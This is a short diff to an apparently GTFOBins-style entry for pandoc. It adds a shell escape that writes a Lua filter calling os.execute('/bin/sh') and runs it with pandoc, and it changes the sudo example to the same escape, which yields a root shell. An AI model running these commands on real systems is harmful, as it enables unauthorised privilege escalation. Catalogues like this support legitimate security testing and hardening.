@@ -8,12 +8,20 @@ functions:
     - code: |
         LFILE=file_to_write
         echo DATA | pandoc -t plain -o "$LFILE"
+  shell:
+    - description: |
+        Pandoc has a builtin Lua interpreter for writing filters.
+    - code: |
+        TF=$(mktemp)
+        echo 'os.execute("/bin/sh")' > $TF
+        pandoc -L $TF /dev/null
   suid:
     - code: |
         LFILE=file_to_write
         echo DATA | ./pandoc -t plain -o "$LFILE"
   sudo:
     - code: |
-        LFILE=file_to_write
-        echo DATA | sudo pandoc -t plain -o "$LFILE"
+        TF=$(mktemp)
+        echo 'os.execute("/bin/sh")' > $TF
+        sudo pandoc -L $TF /dev/null
 ---
